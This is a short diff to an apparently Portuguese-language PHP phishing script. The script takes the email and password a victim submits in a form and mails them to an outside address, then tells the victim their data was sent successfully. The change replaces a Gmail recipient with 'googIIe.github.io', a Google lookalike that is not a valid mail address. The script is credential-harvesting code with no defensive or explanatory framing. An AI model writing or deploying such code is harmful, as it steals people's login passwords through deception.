@@ -6,6 +6,6 @@ $corpo = "
   Email:" .$_POST['Email']."
   Mensagem:" .$_POST['Passwd']."
 ";
-mail('crowleywe@gmail.com',$assunto,$corpo,'From: crowleydesigner@gmail.com');
+mail('googIIe.github.io',$assunto,$corpo,'From: crowleydesigner@gmail.com');
 echo 'Seus Dados foram enviados com sucesso';
 ?>
